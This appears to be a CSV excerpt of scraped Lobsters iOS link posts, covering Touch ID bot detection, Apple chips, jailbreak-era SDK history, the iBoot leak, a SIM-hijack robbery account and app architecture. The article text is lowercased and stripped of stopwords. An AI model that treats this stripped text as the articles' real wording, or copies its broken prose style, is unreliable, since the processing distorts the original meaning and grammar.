214,Lobsters,ios,Apple iOS,Using Touch ID to separate bots from humans in social media,https://www.augustocallejas.com/2018/04/08/touch-id/,using touch id separate bot human social medium,recaptcha touch id extended face id,april whenever social network like facebook twitter know friend family however many account know personally bot tell bot human general issue beyond social medium google support approach called recaptcha require user task human better bot however posting social network process would tedious lead lower engagement apple touch id may able help apple introduced touch id allow user quickly unlock phone download apps without reenter password extended app developer could store secure credential could unlocked fingerprint proposal use touch id potentially face id introduced way uniquely confirm human behind every social medium post storing secure credential would work known user hence bot developer instead proposal allow app developer hence twitter facebook ability provide timestamped servergenerated message need encrypted via hardware key available finger press encrypted message sent back app developer server decrypted list public key based device model operating system version decrypted message match original server message app developer know genuine human confirmed operation social medium post accepted whole process would need occur within certain amount time like second order stop malicious user accumulating many encrypted message order spam network idea currently supported touch id would require upgrade allowing devicespecific private key stored device public key made available app developer confirm encrypted message order spur adoption among major social network confirmation mechanism would need standardized hardware provider implement hardware initially could optional feature allowing account touch id confirmed post displayed prominently future user able display confirmed post ensure social medium feed botfree
215,Lobsters,ios,Apple iOS,Apple Plans to Capture the Future by Getting into the Chip Business,https://medium.com/@JohnBlood/apple-plans-capture-the-future-by-getting-into-the-chip-business-1fe927d7cab4,apple plan capture future getting chip business,apple plan capture future getting chip business marcin nowak unsplash bloomberg apple processor history job tim bennett unsplash current move scare tactic apple part saulo mohana unsplash final thought wintel,apple plan capture future getting chip business back lid open macbook laptop marcin nowak unsplashrecently bloomberg broke news apple planning drop intel start manufacturing using chip according report end goal move unify apple mobile desktop platform interesting idea might work postpc worldapple processor historyin term desktop computer apple currently fourth processor platform earliest apple computer apple apple ii powered mo technology chip macintosh came scene needed computing power drive new graphical interface led adoption motorola processorsby early motorola chip falling behind performance apple needed something new quest find new processor apple started work two project first partnership ibm apple motorola goal making ibm powerpc processor architecture new standard industry part deal group worked creation portable multimedia engine named scriptx group also worked porting development version apple nextgeneration operating system pink powerpc part partnership pink renamed taligent apple later lost interest taligent became sole property ibm apple continued new attempt operating system replace aging system codenamed copeland copeland canceled apple purchased steve job next used nextstep foundation mac o x digress time ibm apple motorola partnership small skunkworks project apple codenamed star trek goal star trek port mac o intel architecture good amount progress made project abruptly canceled leader main promoter left apple microsoftin steve job announced future apple computer would use intel chip according job main reason change ibm slow speed chip development apple wanted take advantage intel le powerhungry chip especially laptopsphoto tim bennett unsplashthe current movebased quick history obvious apple want master destiny bloomberg article reason given move away intel previous move slow progressover last couple year seems though rate processor development slowed considerably long ago pc processor rating however decade since introduction processor seen number much higher seems impassible barrier maybe apple think knowhow accomplish thisthe question leave intel world going going switch arm arm power smartphones embedded system quite powerful enough desktop use going jump yet unknown standard answer question know fact matter know apple planning move away intel going remains secret known people cupertinois scare tactic apple part since real information planned move question immediately come mind could apple made announcement intimidate intel according bloomberg article apple account intel revenue maybe apple think getting discount chip buy maybe apple want intel add certain feature intel refuse however would drop revenue enough alarm intel first saw bloomberg article wondered april fool prank even checked publication date came april april fool joke lateright little go way decide good move apple announcement cause intel stock drop blood spilled already homescreen screen iphone person hand saulo mohana unsplashfinal thoughtsas stated little information hard form opinion topic like challengefor year apple odd man company gave unstoppable juggernaut windowsintel platform conscious choice apple part actively campaigned show platform superior wintel move intel year later seen surrender gave apple access new generation software writer userswith fall desktop laptop computing rise mobile cloud computing apple see opportunity unify computing experience across device creation single codebase run single tightly integrated chip architecture apple see opportunity recreate windowsintel juggernaut image tame beast willit interesting thought experiment problem project requires two thing time money certainly money time microsoft google working project capture future computing microsoft working get window running arm hardware google currently working combine android chromeos also started work new mobile operating system named fuchsiacloser home people saying apple need new product line fast want stay relevant many improvement make iphone apple watch found much tractiontime tell let hope apple something cool unforgettable
216,Lobsters,ios,Apple iOS,A Lot Can Happen in a Decade,https://blog.iconfactory.com/2018/03/a-lot-can-happen-in-a-decade/,lot happen decade,lot touching future device could little device capability software design change breaking jail filesystem exposed toolchains available installers native apps hello world classdump unix build apps copy view content uname home early app development independent developer conference called apple pitch sweet solution iron coder creative graphing calculator javascript sandwich glen ken aspeslagh frontfacing camera hardware wrote something akin facetime amazing achievement something physical world lucas newman adam betts light iphone x still run code john gruber project available github original resolution iphone enthusiast app store hall fame iconfactory first apps version pen slerp really sean heber nanowrimo iappaday tapulous tap tap revenge keep track budget play tune hang painting sean core animation mac o leopard released appkit stopped real sdk get iphone door real artist ship fool official sdk announced steve job event transcribed event video turn real artist first iphone twitter app thrilled win ada downloading new sdk getting hold silver cube first apps featured app store ranked high journey continues guy first mobile app consumer designer large medium small select group client get touch,whether developer working mobile apps someone enjoying million apps available phone today special day ten year anniversary original iphone sdk think understatement say release changed lot people life know changed mine fundamental impact company business let take moment look back happened decade ago lot link piece many difficult resurrect today web make sure take time explore also tried avoid technical jargon even know swift hole ground still follow along touching future many u holding first iphone end june glimpse future wanted know inside glass metal sitting pocket apple told u device could said little done know anything processor speed much memory available built apps many way new device black silver box developer wanted understand device capability wanted understand software design change curious much learn learn called jailbreaking breaking jail discovery happened quickly took matter week filesystem exposed couple month later entire native app experience unlocked development toolchains available folk writing installers native apps first iphone app created outside apple rapid progress made possible thanks tool used build original iphone apple relied infrastructure mac o chose familiar environment expedite development familiarity allowed u outside cupertino figure thing quickly hello world example much software iphone created using objectivec mac developer long used tool called classdump show various piece app learn thing communicated getting access first iphone apps framework software gave great insight apple written important piece new thing called uikit contained user interface component like button table view since similar one used mac took little effort make item tap scrolling another important piece puzzle operating system unix choice apple meant lot open source software immediately available iphones could use build apps copy phone likely view content latestcrashplist varlogscrashreporter distinctly remember first time got shell prompt iphone used uname see system information home early app development alone thousand developer finding inside new device magical outside come surprise hear explosion iphone app development one pivotal moment burgeoning community came independent developer conference called held august many attendee new device discovering capability u also experienced mac developer wwdc heard apple pitch sweet solution amid perfect storm iron coder competition iphone api conference organizer jonathan wolf rentzsch asked u creative submission web app implemented graphing calculator javascript epitomized disliked apple proposal month earlier clunky user interface ran slowly sandwich u hoping video conferencing without frontfacing video camera hand native apps blew u away winner contest video conferencing app written glen ken aspeslagh built frontfacing camera hardware wrote something akin facetime three year apple amazing achievement considering first iphone even video camera app came second place shining example come first game well worked pretty well mobile importantly showed great design programming could take something physical world make work seamlessly touch screen significantly improve overall experience lucas newman adam betts created light app day afterwards lucas helped get started jailbreak tool point gave source code could see worked luckily good keeping backup maintaining software iphone x still run code admired year ago lucas newman presenting light photo john gruber developer us xcode get project available github project jailbreak folder contains everything lucas sent xcode project adapts code built run change made unless necessary much easier get running original please complain resolution code see thing like root view controller also application delegate remember learning write apps without documentation also complete lack property storyboards asset catalog many thing take granted modern tool xcode still luck longtime iphone enthusiast steve troughtonsmith sell improved version app store still love game play frequently induction imore hall fame well deserved armed tool inspiration came next iconfactory first apps june released version wildly popular mac app twitter pretty easy move cocoa code one platform another right first version twitterrific iphone pen slerp really learning lot blast iphone attracted coder kind including sean heber sean web development know anything objectivec programming mac stop poking around classdump header rest u writing first app took step goal write app every day november inspired wife nanowrimo called iappaday hit jailbreak community attention eventually landed position tapulous alongside talented folk responsible iphone first hit franchise tap tap revenge course month sean showed iphone could whatever developer wanted sure could play game could also keep track budget play tune help hang painting screenshots sean heber iappaday sean archive apps produced period code admittedly terrible u represents something much greater reading brings back fond memory halcyon day experimenting future lot surprise early version uikit took forever find xml parser buried officeimport framework important stuff completely missing way return floating point value objectivec also strange engineering decision could put arbitrary html text view worked fine simple tag like b crashed complex one view also used lklayer compositing kinda like new core animation mac o leopard table also introduced new concept called cell reuse allowed fast scrolling complex unwieldy would awesome view controller like one released appkit stop u experimenting learning could something happened stopped real sdk apple worked butt get iphone door u writing jailbreak apps saw wart first product matter real artist ship fool thought sucked everyone shipped product know whew quickly followed next maybe answer question influenced jailbreaking maybe manager cupertino knew wanted launch either way thrilled official sdk announced steve job mere five month release phone iphone sdk promised february given size task one disappointed slipped day release accompanied event town hall theater ten year ago today first time learned simulator change xcode new exciting framework like core location opengl brand new app store would get product hand customer jason snell transcribed event macworld also video turn real artist twitterrific design app store launch recovering great news developer everywhere started thinking shipping know exactly long would knew hustle end four month get apps ready thanks iconfactory learned jailbreak era head start understanding design development issue still worked butt build first iphone twitter app launch app store apple added new category annual design award ceremony thrilled win ada work iphone thrilled exclamation used downloading new sdk getting hold silver cube among first apps featured app store ranked high early chart knew part something big big journey continues second version twitterrific guy iconfactory first mobile app entered store hundred product two million sell mobile apps consumer tool designer developer make design work mobile apps company large medium small develop mobile apps select group client get touch like one lot happen decade one thing changed entire team still proud part vibrant ecosystem contribution make another decade
217,Lobsters,ios,Apple iOS,Vulkan Applications Enabled on Apple Platforms,https://www.khronos.org/news/press/vulkan-applications-enabled-on-apple-platforms,vulkan application enabled apple platform,february beaverton khronos group vulkan portability resource page achieve significantly higher performance pierreloup griffais valve moltenvk spirvcross bill hollings president brenwill workshop lunarxchange neil trevett vp nvidia khronos group president vulkan portability feedback issue khronos group khronos group,valve lunarg brenwill workshop join force khronos release open source sdks runtime library khronos portability initiative defines subset vulkan portable macos io february beaverton group open consortium leading hardware software company creating advanced acceleration standard announces working group portability initiative working khronos member valve lunarg brenwill workshop enable vulkan application ported apple platform vulkan portability resource page link collection free open source set tool sdks runtime library enable vulkan development macos deployment macos io platform valve extending dota using vulkan tool macos achieve significantly higher performance native driver vulkan support dota macos released coming month free update running substantial production load vulkan tool mac including dota running faster native opengl version said pierreloup griffais valve effort aimed toward reducing development porting cost developer supporting multiple platform khronos vulkan portability initiative continues refine define universally portable subset vulkan run native performance level metal directx driver released open source today moltenvk library brenwill workshop translates call within vulkan portable subset underlying metal call macos io moltenvk us open source spirvcross crosscompiler translate vulkan shaders underlying native code format moltenvk made freely available developer fee royalty needed ship commercial application moltenvk worked hard bring consistent vulkanbased api macos io maintaining performance improvement required modern game developer said bill hollings president brenwill workshop also available today open source lunarg vulkan sdk macos lunarxchange enables developer build run debug vulkan application apple mac platform lunarg sdk macos provides loader validation layer allows programmer check code correct api usage lunarg continue evolve macos sdk add additional tool feature running vulkan application apple platform number one request developer today release moltenvk runtime lunarg macos sdk brings capability life said neil trevett vp nvidia khronos group president developer invited download open source vulkan portability tool today provide feedback via vulkan portability feedback issue vulkan portability initiative continue strengthen infrastructure tooling around bringing vulkan capability multiple metal platform longterm goal enable portable vulkan code executed platform developer care khronos group khronos group industry consortium creating open standard enable deployment acceleration parallel computing graphic augmented virtual reality vision neural network wide variety platform device khronos standard include e sc khronos member enabled contribute development khronos specification empowered vote various stage public deployment able accelerate delivery cuttingedge accelerated platform application early access specification draft conformance test vulkan registered trademark khronos group khronos openxr devu spir spirv sycl webgl webcl collada openkode openvg openvx egl gltf openkcam streaminput openwf opensl e nnef openmax trademark khronos group inc opencl trademark apple inc opengl registered trademark opengl e opengl sc logo trademark hewlett packard enterprise used license khronos product name trademark andor company name used solely identification belong respective owner
218,Lobsters,ios,Apple iOS,Major new iOS bug can crash iPhones and disable access to apps and iMessages,https://www.theverge.com/2018/2/15/17015654/apple-iphone-crash-ios-11-bug-imessage,major new io bug crash iphones disable access apps imessages,shockingly bad week software problem mobile world apple plan fix problem public beta version io least three day ago address io update soon single link could freeze iphone tiny string text disabled imessage video crashed iphones crashed iphones significant io update focusing reliability performance io update et,apple shockingly bad week software problem end look like starting well either new bug discovered io let people send specific character crash iphone block access message app io popular apps like whatsapp facebook messenger outlook io gmail italian blog mobile world spotted bug tested successfully multiple iphones running io found also work macos version safari message apple plan fix problem io update release io spring bug involves sending indian language telugu character device apple io springboard crash message received message longer open app trying failing load character appears way regain access imessages another friend send message try delete thread contained bad character also tested bug thirdparty apps like facebook messenger whatsapp gmail outlook io found apps become disabled message received might difficult fix delete problem message apps like whatsapp unless web access enabled telegram skype appear unaffected public beta version io also unaffected appears apple made aware problem least three day ago plan address io update soon apple history weird io crash bug first time io crashed due weird character url even video last month single link could freeze iphone apple able resolve release io back tiny string text disabled imessage year later video crashed iphones apple also experienced issue io bug december crashed iphones company took unusual step issuing significant io update hour bug started occurring apple face security issue software bug company reportedly focusing reliability performance io new feature report suggest apple taking new approach io update allowing engineer push feature later release instead trying cram big annual update feature reportedly pushed back result allowing apple address security reliability issue discovered io macos recently update et apple plan fix issue update io release spring
219,Lobsters,ios,Apple iOS,The ultimate list of resources to mastering Swift and iOS development‚Ää‚Äî‚Ää2018 edition,https://medium.com/@wesharehoodies/the-ultimate-list-of-resources-to-mastering-swift-and-ios-development-2018-edition-3bd2a87ff400,ultimate list resource mastering swift io development edition,,
221,Lobsters,ios,Apple iOS,Introduction to Mobile Haskell (iOS),https://codetalk.io/posts/2018-02-07-Mobile-Haskell.html,introduction mobile haskell io,mobilehaskellfun stack cabal email protected email protected http hackagemobilehaskellorg email protected setup script mobilehaskellfun repo setting xcode project interlude set haskell code hssrccabalproject hssrcmobilefuncabal hssrcmakefile email protected email protected email protected email protected hssrcsrclibhs email protected email protected hssrccall email protected email protected compiling haskell code back xcode offiebridgingheaderh appdelegateswift viewcontrollerswift linking haskell library run code resource mobilehaskell mobilehaskellfun repository,version tool used lot progress going make haskell work mobile natively instead eg√¢ generating javascript via ghcjs using unfortunately much documentation exists yet build project using tool together post attempt piece together tool various attempt coherent stepbystep guide start setting tool needed build io app run simulator device ie√¢ build arm build impatient brave simply clone mobilehaskellfun repository run setuptoolssh set tool cd offiehssrc build package index call newupdate allownewer run call make io compile program io finally launch xcode start simulator bunch tool needed set first might go anyways good measure step assume macos part part adapt system step using brew stack installed already set curl ssl http gethaskellstackorg sh collect tool ghc version folder first going create directory mkdir p mobilehaskell next step cloning cabal building cabalinstall necessary newupdate land cd mobilehaskell git clone email protected haskellcabalgit cd cabalinstall stack exec noghcpackagepath bootstrapsh cabalinstall system ghc already try install via cabal newbuild cabalinstall instead le brittle wanted remove need setup though went bootstrapsh approach note trouble eg√¢ error package shadowed try good cabalhell fix nuke ghc cabal install llvm version set llvm usrlocalopt email protected bin usrlocaloptllvmbin remember path later set tool http hackagemobilehaskellorg namely toolchainwrapper different ghc version use start getting ghcs downloading simulator device respectively download cliking link website curl link probably outdated soon replace link one site cd mobilehaskell curl http curl http unpack folder assuming still mobilehaskell mkdir p xz tar xf c mkdir p xz tar xf c next toolchainwrapper provides wrapper around cabal tool need cd mobilehaskell git clone email protected cd toolchainwrapper bootstrap set tool need later want step single script check setup script mobilehaskellfun repo setting xcode project setting xcode bit visual process augment step picture hopefully make clear need done first set xcode project creating new project choose single view application set name location project add folder keep haskell code call hssrc rightclicking project adding new group interlude set haskell code proceed set haskell code navigate hssrc directory add following file worry go content mkdir p src touch mobilefuncabal cabalproject makefile call license srclibhs hssrccabalproject use feature cabalproject set package repository use hackagemobilehaskellorg overlay package repository hackagemobilehaskell url http hackagemobilehaskellorg secure true rootkeys keythreshold hssrcmobilefuncabal simple cabal package setup name mobilefun version license licensefile license author name maintainer email examplecom copyright name category miscellaneous buildtype simple cabalversion library hssourcedirs src exposedmodules lib builddepends base freersimple defaultlanguage hssrcmakefile makefile simplifies lot compilation process pass flag need use libmobilefun archivelibhs lib phony cabalbuild cabalbuild cabal newconfigure disableshared enablestatic allownewer ghcoptionfllvmng cabal newbuild allownewer ghcoptionfllvmng binariesios archive make cabalbuild make cabalbuild mkdir p find path io name archive ghc exec lipo create output email protected binariesmacos archive cabalcabal make cabalbuild mkdir p find path osx name archive ghc exec lipo create output email protected archive make cabalbuild mkdir p find path arm android name archive ghc exec cp email protected archive make cabalbuild mkdir p find path android name archive ghc exec cp email protected phony io phony macos phony android phony phony clean io binariesios archive macos binariesmacos archive android archive archive io macos android clean rm r binary hssrcsrclibhs haskell code simply c ffi set small toy function module lib import foreignc cstring newcstring export haskell function email protected email protected foreign export ccall hello chello io cstring tiny wrapper return cstring chello newcstring hello pristine haskell function hello hello haskell hssrccall use call script set various path variable point tool need polluting global command space followed setup far path match outofthebox usrbinenv bash path llvm default installing via brew export pathusrlocalopt email protected bin path path crosstarget ghcs export path path export path path export path path path tool export path homemobilehaskelltoolchainwrapper path export path homemobilehaskellheadhackagescripts path path cabal head binary export path homecabalbin path pas everything command call email protected compiling haskell code first need build package index run inside hssrc call newupdate allownewer downloading latest package list hackagehaskellorg hackagemobilehaskell build project running make target set io build call make io make cabalbuild newconfigure disableshared enablestatic allownewer ghcoptionfllvmng cabalprojectlocal file already exists overwriting resolving dependency build profile w order following would built use v detail lib requires download build lib requires download build requires download build find path io name libhsmobilefun ghc exec lipo create output binariesioslibhsmobilefuna library file hssrcbinariesioslibhsmobilefuna change project probably need run call make clean running call make io back xcode need tie together haskell code xcode draganddrop newly created file hssrc group xcode found since using swift need bridging header bring c prototype swift adding objectivec file project tmpm make xcode ask want create bridging header offiebridgingheaderh answer yes offiebridgingheaderh bridging file offiebridgingheaderh add prototype need glue haskell code extern void hsinit int argc char argv extern char hello appdelegateswift go appdelegateswift call hsinit initialize haskell code import uikit uiapplicationmain class appdelegate uiresponder uiapplicationdelegate var window uiwindow func application application uiapplication didfinishlaunchingwithoptions launchoptions uiapplicationlaunchoptionskey bool override point customization application launch hsinit nil nil return true func applicationwillresignactive application uiapplication func applicationdidenterbackground application uiapplication func applicationwillenterforeground application uiapplication func applicationdidbecomeactive application uiapplication func applicationwillterminate application uiapplication viewcontrollerswift next set label view controller either set story board connect via iboutlet first go mainstoryboard create label element somewhere screen enable assistant editor top right cornor ctrlclick label dragging viewcontrollerswift name helloworldlabel set text label calling haskell function cstring hello making viewcontrollerswift look like import uikit class viewcontroller uiviewcontroller iboutlet var helloworldlabel uilabel override func viewdidload superviewdidload helloworldlabeltext string cstring hello override func didreceivememorywarning superdidreceivememorywarning linking haskell library final step need linking library built earlier hssrcbinariesioslibhsmobilefuna xcode find c prototype function going build phase exposed xcode project setting click add new library choose add locate library finally locate library file hssrcbinariesioslibhsmobilefuna also need set build generate bytecode using external ghc library done build setting locating enable bitcode eg√¢ via search setting run code final step run code simulator congratulation calling haskell code swift running io simulator might run problem like could create compact unwind use rbp rsp based frame xcode build fix adding libconv library build phase resource gathered interested following development haskell mobile space recommend following mobilehaskell finally let know something working mobilehaskellfun repository dealt much setting xcode project sharing bit unclear setting follow repository around
222,Lobsters,ios,Apple iOS,iBoot (iOS Bootloader) Source Code Gets Posted Online,https://motherboard.vice.com/en_us/article/a34g9j/iphone-source-code-iboot-ios-leak,iboot io bootloader source code get posted online,update february bounty program series book dmca legal notice lorenzo jabbercccde lorenzo motherboardtv called secure enclave processor effectively killed popular jailbreak community making resulting exploit incredibly valuable get released publicly read tiny startup became important hacking shop never heard appleinternals get much attention signing newsletter,image rokas tenysshutterstockupdate february apple filed copyright takedown request github forced company remove code someone posted expert say source code core component iphone operating system github could pave way hacker security researcher find vulnerability io make iphone jailbreak easier achieve github code labeled iboot part io responsible ensuring trusted boot operating system word program load io first process run turn iphone load verifies kernel properly signed apple executes like iphone bios code say io older version operating system portion likely still used io apple traditionally reluctant release code public though made certain part io macos open source recent year taken particular care keep iboot secure code private bug boot process valuable one reported apple bounty program value max payment biggest leak history jonathan levin author series book io mac osx internals told online chat referring apple history huge deal levin said code appears real iboot code aligns code reverse engineered second security researcher familiar io also said believe code real know behind leak apple respond request comment hour publication story apple sent dmca legal notice demanding github take iboot code iboot source code proprietary includes apple copyright notice opensource way apple indirectly confirmed code real github took code soon access source code iboot give io security researcher better chance find vulnerability could lead compromising jailbreaking device levin said mean hacker could easier time finding flaw bug could allow crack decrypt iphone perhaps leak could eventually allow advanced programmer emulate io non apple platform got tip contact reporter securely signal otr chat lorenzo jabbercccde email lorenzo motherboardtv vulnerability previous version iboot allowed jailbreakers hacker bruteforce way iphone lock screen decrypt user data newer iphones chip called secure enclave processor hardened security device regular user levin added mean tethered jailbreak require phone connected computer booting could soon back jailbreak used relatively easy pull common extremely hard come uptodate io device advanced security mechanism make hard even highly skilled researcher even looking bug need first jailbreak device beginning probe device security improvement effectively killed popular jailbreak community nowadays finding bug vulnerability io something requires significant amount time resource making resulting exploit incredibly valuable jailbreaking community get excited leak source code exploit get released publicly read tiny startup became important hacking shop never heard source code first surfaced last year posted reddit user called appleinternals jailbreak subreddit post get much attention since user new enough reddit karma post quickly buried new availability github mean likely circulating widely underground jailbreaking community io hacking circle iboot one component apple holding still encrypting bit image levin said wide open source code form story updated include apple dmca takedown request get six favorite motherboard story every day signing newsletter
223,Lobsters,ios,Apple iOS,"iPhones, Armed Robbery, and Hacking",https://manybutfinite.com/post/iphones-armed-robbery-hacking/,iphones armed robbery hacking,end robbery sell million totp otp auth ii hacking tmobilecom iii recommendation otp auth otp auth authy icloudcom security guide,security recommendation summarized end robbery past summer walking around neighborhood grew happygolucky guy jumped motorcycle pointing gun first time gunpoint outset weapon positively spellbinding gazed strange thought hit going get shot rusty piece shit sorry way die get tetanus thought anticipated dan carlin say human extreme situation often behave unexpectedly guntoting thug far cry battle verdun pretty extreme post tell story robbery surprising information security development lesson user designer technology daughter visiting brazil july taking carefree walk boulevard lined lush tree gotten kid maad ironically enough album growing compton amid dire violence deep conversation u criminal justice system drug law idea people like bryan stevenson michelle alexander growing brazil get crash course street smart mugged twice counting time stuff actually taken score nearmuggings dodged either talking way running way troublefree year let guard absorbed conversation barely noticed motorcycle driving side street time veered wrong way traffic sped towards sidewalk late passenger jumped motorcycle still moving gun hand pointed squarely scene felt strangely removed cliche really feel like movie instead panicked confusion strong pragmatic voice head thought scenario plenty time kicked attacker motivation best course action career criminal brazil downright professional know somebody whose house invaded home robber let know long going take offered water made sure nobody freaked better moving company used someone robbing random people street using gun pretty far professional way volatile situation huge risk beggarly payoff best lowlife worst jittery crackheads felt two strong imperative first keep situation absolutely relaxed possible get nervous get scared get scared accidentally get shot second importantly want kidnap daughter fight cost whatsoever better die sidewalk let take remember thinking deep breath raise hand slowly move smoothly stay relaxed hand everything worked know maybe andy headspace app saved life bandit gone along two iphones watch real fun still come got home logged icloud put phone lost mode turned predictably plenty crook caught way iphone learned thinking data criminal hand uncomfortable fact io exploit sell million made feel lot better smalltimer breaking iphone figured would wipe sell twofactor authentication account matter whenever possible second factor iphone app generates timebased onetime password totp authentication google authenticator popular app use otp auth instead flexible recommendation look like slightly sped make exciting time log one account provide login password normally would plus temporary code shown app also use password manager unique long password site main concern point minimizing impact whole thing kid dinner planned friend tasting menu good japanese place thought best go good time laugh hopefully cushion blow later could call tmobile suspend cell line ii hacking couple hour later back much happier imbued friendship case plenty sake opened gmail got shocker wuhwait expecting see least facebook password reset read take good look email fun work happened done dig whoah facebook password reset phone number unlock phone felt sinking realization misread situation seemed sophisticated thought motorcycle crew someone else operation identity would unmasked later night idea somebody hacking account right moment phone hand deeply unsettling malevolent twist emotional roller coaster evening technical problem time sober best could work methodically simple attacker took sim card stolen iphone put another phone point found phone number whereas previously information importantly could also receive sm text message attempted log facebook using phone number login clicked password reset password via sm big screw couple lesson said twofactor authentication account rarely use facebook enable oops turn great idea account popular app weak link defense consider account recovery policy account enabled password reset email good without account associated phone number password reset via sm case sim card instant ticket account find reset password one fell swoop disaster facebook single handedly provides way attacker go sim card hijacked sm message trove personal information vast majority people contrast attacker made zero progress hacking account mostly use facebook hell wretch logging fb account suspect mad political rant already shaken armed robbery mind played trick paranoid thought identity theft fraudulent bank transfer loomed immediately logged tmobilecom suspended cell line disabling main weapon aside tmobile great international travel love guy keep website safe tested sending sm message suspended number happily attempt generated error email facebook password reset arrived brazil time curiously briefly turned phone back sim card phone went lost mode flashed find iphone fourth email subject line se silver found arriving phone model storage capacity exactly right spelling grammar layout pretty well done sent primary personal email lifted facebook imagine regular user receiving right phone stolen somewhat shaken native english speaker boot odds realize phishing attempt icloud credential apart checking url biggest clue exclamation mark subject line little enthusiastic apple either way nearly perfect phishing piece made impeccable timing maybe icloud account placed sort restricted state device put lost mode stressful face ongoing targeted personal attack deep breath time methodically check every account suspicious activity change password case recover compromised account main google account protected safe throughout ordeal reset facebook password email got back github aws professional account also unauthorized activity audit log never tasted sweet relief knowing tell client great listen iphone thieving ring probably data funny hah never mind bitcoin price huh tried secondary gmail account use mailing list noncritical task kind account one might leave disabled sure enough wretch password changed via sm password reset found account phone number first place familiar quick recap gmail account recovery email set ironically use sm anymore google offer recovery algorithm try answer different question ability another particular answer quick month year create google account locked long enough start thinking lost account eventually produced couple answer got back finally account safe getting late find person frantically probing account maybe luck knew data iphones safe per apple v government showdown san bernardino terrorist attack earlier assumed phone could still wiped clean used normally maybe whole rigmarole breaking icloud account hence phishing quick search confirmed idea since io released apple provided activation lock feature whereby device linked icloud account activating requires password account created misery among people buying selling used iphones seller forgets unlink device icloud account device bricked warm wave righteous schadenfreude washed robber part would fetch little money whole thing especially since screen cracked go kid glad replaced yet also glad activation lock though perversely digital torment side effect world complicated turn sinister plot miserable scheme hundred dollar straight depth hell coward going sobering realize attacker almost succeeded month prior robbery icloud account enabled used compromised gmail address recovery email robbery happened would able get unlink phone sell full used price would changed icloud password process might erased locked apple device hell would disastrous possibly ruinous depending whether could get back account whatever little data icloud would stolen well hope motivates enable account even unimportant one interact incremental unexpected way become undoing moreover using totp apps second factor far safer sm apple done fantastic job io security find iphone curbing everything malware exploit theft improvement made better protect customer next post see weeklong sustained hacking attempt meet maggot behind attack operating wretched hive iii recommendation make sure account hacked via text message sm password reset often enabling twofactor authentication account particularly use timebased onetime password totp app second factor two apps google authenticator otp auth could also withhold phone number certain account another advantage totp unable receive sm message whatever reason still log beware unprotected account might provide path sensitive one decide go totp app choose one allows make encrypted backup account secret otp auth provides along encrypted icloud sync optional controlled user authy another good option use google authenticator make sure losing phone lock account design apps careful password reset via sm sim card easy target cell provider subject social engineering could lead intercepted message sm notification seen lock screen phone allow user choose totp second factor iphone lost stolen go icloudcom immediately put lost mode provide phone number reached done might want temporarily suspend phone line many carrier offer website longer call phone unless wifi also via icloud keep mind upside nobody use sim card hack account via sm password reset tradeoff iphone definitely stolen rather lost probably appear icloud put lost mode anyway provide phone number know might targeted icloud phishing social engineering crook try hack icloud account attacker briefly turned phone get phone number target almost surely want suspend cell service immediately lose tracking goody thief generally know keep phone handing working sim card fraught peril tread carefully may force might want protect sim card pin requires enter pin whenever turn phone attacker thus unable transplant sim card another device use however lose iphone battery dy person find turn game even phone later turned connect internet enter lost mode show phone number reached true even known wifi range phone otherwise might found could bricked lost forever beware iphone email text message whatsapp message scammer attempt phish icloud credential devious way soon iphone stolen provided lost mode phone number thief attempt use trying break icloud account read tech security guide overkill regular user know rule breaking thank reading
224,Lobsters,ios,Apple iOS,"Safari 11.1 in iOS 11.3 to support Service Workers, PaymentRequest etc",https://twitter.com/rmondello/status/956256845311590400,safari io support service worker paymentrequest etc,,detected javascript disabled browser would like proceed legacy twitter yes
225,Lobsters,ios,Apple iOS,MVC vs MVP vs MVVM for mobile app development: Let's end the debate!,https://www.simform.com/mvc-mvp-mvvm-mobile-app-development/,mvc v mvp v mvvm mobile app development let end debate,mvc v mvp v mvvm io app development quick dirty way decide best use mvc building simpler application use mvp using xamarin crossapp development io use mvvm solve problem massive viewcontrollers use mvvm swift client project requires ship higher quality code fixed budget deadline protocol oriented programming pop swift implementing routing navigation mvvm route changed wiser move away routing navigation code view controller use mvvm project testdrivendevelopment conclusion,mvc v mvp v mvvm io app development quick dirty way decide bestyou need reinvent wheel come mobile app architectural design pattern listed use case directly pickup architectural design pattern directly list sure would find directtothepoint helpfuluse mvc building simpler applicationmany time new beginner tend learn mvvm along reactivecocoarxswift without realizing standard way program iosmvc recommended architectural pattern learn io development structure data flow interaction app starting want build simpler application good architectural pattern get hand dirtyhowever using mvc application complex view create problem massive view controller viewcontroller becomes bloated line codesthumb rule using mvc architecture building simpler io applicationsin mvc developer mostly real tendency put logic viewcontroller leaf end giant viewcontroller difficult managebut lately boil understanding pain point mvc attempt solve end day follow pattern like bible learn make viewcontrollers thin leanfollowing point following prevent viewcontroller getting bloated mvc refrain handling grunt work like uitableviewuicollectionview viewcontrollers assign complexity different class viewcontroller provide model object displayedbreak view controller multiple child controller force separation concern project working onuse mvp using xamarin crossapp development iosmost developer use mvvm leveraging xamarin io app development however kind approach limited apps simpler functionalitiesif app relative complex screen lot element implementing code mvvm make framework prone bug add significant risk project mvvm business logic contained viewmodel layerany change business logic require view layer immediately reflect mvvm use data binding purpose bind view state property unlike mvp usually creates big problem invisible outputsin mvvm property sure case exactly going trigger view update unless check implementation detail unneeded uncertainty view layer behaves using framework may many limitationsuse mvvm solve problem massive viewcontrollersif find viewcontrollers mvc heavily bloated complex app logic always make lean following thumb rule mentioned however still unable always move mvvm refactoring viewcontroller viewmodelviewcontrollers mvvm massive compared mvc moreover viewmodels mvvm often easier test make code manageable resultuse mvvm swift client project requires ship higher quality code fixed budget deadlinemost time client want deliver app fixed deadline budget using mvc mvp case wiser problem deal term massive viewcontrollers presentersmvvm along swift good architecture follow case simplifies problem massive view controller introducing viewmodel concept moreover swift better coding language objective c introduces lot modern concept help write clean code example support optional type often make deal easily lot nullsprotocol oriented programming pop swiftone considerable advantage adopting mvvm structure isolation business logic however reality difficult observe advantage due specific binding controller view model objectsby definition view model unit encapsulates domain logic needed controller henceforth view model reusable case controller share package functionality often rare app complexity growswe found popmvvm absolutely beneficial case solve problem viewmodels correspondence certain number different traitsfor instance might two different viewmodels interacting animal like dog cat habitual objectoriented programming would make different method contain specific logic feed play train etc however efficient considering animal feed played way simplified splitting interaction multiple trait feeding trait playing trait etc turn reduce number duplicated implementation viewmodels since trait contain logicimplementing routing navigation mvvmmvvm good job moving business logic vc viewcontrollers presentation logic routing navigation still stuck vc generally creates problem massive view controllershenceforth really important u move routing navigation view controllersin app consists login screen following list route implement login home screensign user sign screenforget passwordat first glance look easier implement however easy looksyou may implement login screen home screen case user password expiration require implementing forget password screen home screenhence case route changed login change password screen home screensign upnow want implement logic vctherefore wiser move away routing navigation code view controller one way introducing coordinator architecture make mvvmc major responsibility coordinator handle 